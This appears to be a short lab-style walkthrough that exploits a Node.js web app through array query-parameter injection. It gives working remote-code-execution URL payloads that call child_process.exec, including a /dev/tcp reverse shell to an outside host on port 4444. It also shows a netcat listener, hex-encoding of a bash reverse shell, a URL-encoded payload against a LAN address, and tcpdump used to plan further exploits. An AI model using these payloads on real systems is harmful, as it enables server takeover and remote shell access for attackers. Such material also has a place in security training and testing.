## Check for exploit
Node allows variables to be parsed as an array not a string
```
http://localhost:3000/?name[]=&name[]='
```

Becuase of this remote code execution is possible:
```
http://localhost:3000/?name[]=x&name[]=y'-require('child_process').exec('curl+-XPOST+localhost%3A3000+-d+%22Badguys%22')-'
http://localhost:3000/?name[]=x&name[]=y'-require('child_process').exec('0<&196;exec 196<>/dev/tcp/ssh.demo.gs/4444; sh <&196 >&196 2>&196')-'
```

First start a netcat server on your remote host which you have control of.
```
netcat -l -p 4444
```

Creating a string is easy first encode the script to execute, the following script will make a connection to a netcat server which is waiting at the other end on port 4444
```
xxd -c 256 -pu <<< 'bash -c "0<&196;exec 196<>/dev/tcp/your.server/4444; sh <&196 >&196 2>&196"'
```

Then past the output into the vunerability replacing `HEX GOES HERE` with your hex code, the string has to be fully url encoded in order for it to work, if it is not then the nodejs application will not evaluate the string in the correct way.
```
http://192.168.122.35:3000/?name[]=x&name[]=y%27-require(%27child_process%27).exec(new%20Buffer(%27%HEX GOES HERE%27,%27hex%27).toString())-%27
```

We can use this to execute commands to the remote bash session, this is slightly more rudimentary than SSH however is enough for our needs, to examine the traffic flowing through the server we can use tcpdump
```
tcpdump -lni eth0 not port 4444
```

This should give us some more information on where our next exploit is going to be.

